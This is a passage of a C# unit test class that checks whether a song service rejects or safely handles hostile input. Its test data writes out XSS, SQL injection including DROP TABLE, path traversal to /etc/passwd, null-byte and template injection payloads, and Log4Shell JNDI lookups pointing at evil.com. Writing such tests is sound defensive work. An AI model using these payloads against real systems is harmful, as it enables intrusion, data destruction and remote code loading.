    [InlineData("<script>alert('XSS')</script>", "HTML script tag")]
    [InlineData("<img src=x onerror=alert('XSS')>", "HTML img tag")]
    [InlineData("javascript:alert('XSS')", "JavaScript protocol")]
    public async Task CreateSongAsync_ShouldRejectMaliciousInput_InNotes(string maliciousInput, string attackType)
    {
        // Arrange
        var song = new Song
        {
            Title = "Test Song",
            Artist = "Test Artist",
            Notes = maliciousInput,
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("Notes", $"should reject {attackType} in notes");
    }

    [Theory]
    [InlineData("../../../etc/passwd", "Path traversal attack")]
    [InlineData("..\\..\\..\\windows\\system32", "Windows path traversal")]
    [InlineData("%2e%2e%2f%2e%2e%2f", "URL-encoded path traversal")]
    [InlineData("....//....//", "Obfuscated path traversal")]
    public async Task CreateSongAsync_ShouldRejectPathTraversal_InAlbum(string maliciousInput, string attackType)
    {
        // Arrange
        var song = new Song
        {
            Title = "Test Song",
            Artist = "Test Artist",
            Album = maliciousInput,
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("Album", $"should reject {attackType}");
    }

    [Fact]
    public async Task GetSongsAsync_ShouldHandleMaliciousSearchTerm_Safely()
    {
        // Arrange - Create legitimate songs
        var songs = new List<Song>
        {
            new Song { Title = "Bohemian Rhapsody", Artist = "Queen", UserId = _testUserId },
            new Song { Title = "Stairway to Heaven", Artist = "Led Zeppelin", UserId = _testUserId }
        };
        _context.Songs.AddRange(songs);
        await _context.SaveChangesAsync();

        // Act - Try malicious search terms (should be handled safely via parameterized queries)
        var maliciousSearchTerms = new[]
        {
            "'; DROP TABLE Songs; --",
            "1' OR '1'='1",
            "<script>alert('XSS')</script>",
            "../../etc/passwd",
            "%00null%00"
        };

        foreach (var maliciousTerm in maliciousSearchTerms)
        {
            // Should not throw exception or execute malicious code
            var (result, totalCount) = await _songService.GetSongsAsync(_testUserId, searchTerm: maliciousTerm);
            
            // Assert - Should return empty or safe results (parameterized query prevents injection)
            result.Should().NotBeNull("malicious search should not crash the service");
            // Original songs should still exist
            var allSongs = await _context.Songs.ToListAsync();
            allSongs.Should().HaveCount(2, "malicious input should not modify database");
        }
    }

    [Theory]
    [InlineData("DROP TABLE Songs", "SQL command injection")]
    [InlineData("DELETE FROM Songs", "SQL delete injection")]
    [InlineData("UPDATE Songs SET", "SQL update injection")]
    [InlineData("EXEC sp_", "SQL stored procedure injection")]
    public async Task GetSongsAsync_ShouldNotExecuteSqlCommands_InGenreFilter(string maliciousGenre, string attackType)
    {
        // Arrange
        var song = new Song
        {
            Title = "Test Song",
            Artist = "Test Artist",
            Genre = "Rock",
            UserId = _testUserId
        };
        _context.Songs.Add(song);
        await _context.SaveChangesAsync();

        // Act - Try to inject SQL via genre filter
        var (result, totalCount) = await _songService.GetSongsAsync(_testUserId, genre: maliciousGenre);

        // Assert - Should not execute SQL commands (parameterized query prevents injection)
        result.Should().BeEmpty($"malicious {attackType} should not match any songs");
        
        // Verify database is intact
        var allSongs = await _context.Songs.ToListAsync();
        allSongs.Should().HaveCount(1, "malicious input should not modify database");
    }

    [Fact]
    public async Task CreateSongAsync_ShouldRejectNullByteInjection()
    {
        // Arrange - Null byte injection attempt (used in path traversal)
        var song = new Song
        {
            Title = "Test Song\0.exe",
            Artist = "Test Artist",
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("Song title", "should reject null byte injection");
    }

    [Fact]
    public async Task CreateSongAsync_ShouldRejectUnicodeHomoglyphAttacks()
    {
        // Arrange - Unicode homoglyph attack (looks like legitimate text but uses different characters)
        var song = new Song
        {
            Title = "Admіnіstrator", // Uses Cyrillic 'і' instead of Latin 'i'
            Artist = "Test Artist",
            UserId = _testUserId
        };

        // Act - Should either accept (as valid Unicode) or reject if homoglyph detection exists
        // For now, just verify it doesn't cause system issues
        try
        {
            var result = await _songService.CreateSongAsync(song);
            
            // If accepted, verify it's stored correctly
            result.Should().NotBeNull();
            result.Title.Should().Be("Admіnіstrator");
        }
        catch (ArgumentException)
        {
            // Acceptable if validation rejects suspicious Unicode
            Assert.True(true, "Service correctly rejected suspicious Unicode characters");
        }
    }

    [Theory]
    [InlineData("${jndi:ldap://evil.com/a}", "Log4Shell attack")]
    [InlineData("${jndi:dns://evil.com}", "JNDI injection")]
    [InlineData("#{7*7}", "Expression language injection")]
    [InlineData("{{7*7}}", "Template injection")]
    public async Task CreateSongAsync_ShouldRejectCodeInjection_InNotes(string maliciousInput, string attackType)
    {
        // Arrange
        var song = new Song
        {
            Title = "Test Song",
            Artist = "Test Artist",
            Notes = maliciousInput,
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("Notes", $"should reject {attackType}");
    }

    #endregion

    public void Dispose()
    {
        _context?.Dispose();
    }
}